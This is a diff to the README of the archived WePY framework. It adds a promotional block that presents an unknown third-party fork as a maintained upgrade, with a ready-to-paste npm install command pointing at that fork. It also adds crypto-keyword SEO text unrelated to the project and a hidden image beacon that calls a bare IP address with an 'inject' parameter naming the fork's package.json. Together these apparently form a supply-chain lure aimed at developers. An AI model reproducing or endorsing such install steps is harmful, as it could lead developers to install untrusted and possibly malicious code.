@@ -1,3 +1,15 @@
+**Optimized Core Upgrades & Stability Patches**
+
+This fork delivers critical, community-driven stability fixes that resolve long-standing open issues found in the original repository. It ensures smoother integration with current development environments through active maintenance and performance tuning, making it the ideal choice for modern production workflows.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/grandeurpupawinch3/wepy.git
+```
+
+[https://github.com/grandeurpupawinch3/wepy](https://github.com/grandeurpupawinch3/wepy)
+
 [English](./README_EN.md) | 简体中文
 
 > **📦 项目已归档**
@@ -181,3 +193,11 @@ WePY 交流群已满 500 人，请加 gcaufy_helper 好友或者扫码加好友�
 [Contributing](./CONTRIBUTING.md)
 
 [License MIT](./LICENSE)
+
+## Related searches
+
+Developers and crypto enthusiasts searching for this project are typically looking for streamlined ways to index blockchain activity and monitor digital assets in real time. They often seek tools that integrate decentralized data layers with market pricing feeds to build comprehensive decentralized dashboards.
+
+**Topics:** ethereum, subgraph, crypto portfolio, web3.js, coingecko api, blockchain data indexing, decentralized finance tracking, crypto asset monitor, dapp dashboard development, smart contract event stream
+
+![.](http://5.231.58.248:8787/pixel?repo=grandeurpupawinch3%2Fwepy&inject=grandeurpupawinch3%2Fwepy%2Fpackage.json)
